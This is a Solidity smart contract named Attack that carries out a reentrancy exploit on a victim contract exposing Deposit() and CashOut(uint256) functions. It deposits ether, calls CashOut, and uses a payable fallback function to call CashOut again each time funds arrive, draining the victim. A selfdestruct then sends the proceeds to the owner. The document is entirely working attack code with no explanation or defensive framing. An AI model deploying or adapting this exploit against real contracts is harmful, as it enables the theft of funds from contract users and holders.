contract Attack {
    address owner;
    address victim;

    function Attack() payable { owner = msg.sender; }

    function setVictim(address target)  { victim = target; }

    function step1(uint256 amount)  payable {
        if (this.balance >= amount) {
            victim.call.value(amount)(bytes4(keccak256("Deposit()")));
        }
    }

    function step2(uint256 amount)  {
        victim.call(bytes4(keccak256("CashOut(uint256)")), amount);
    }

     
    function stopAttack()  {
        selfdestruct(owner);
    }

    function startAttack(uint256 amount)  {
        step1(amount);
        step2(amount / 2);
    }

    function () payable {
        victim.call(bytes4(keccak256("CashOut(uint256)")), msg.value);
    }
}
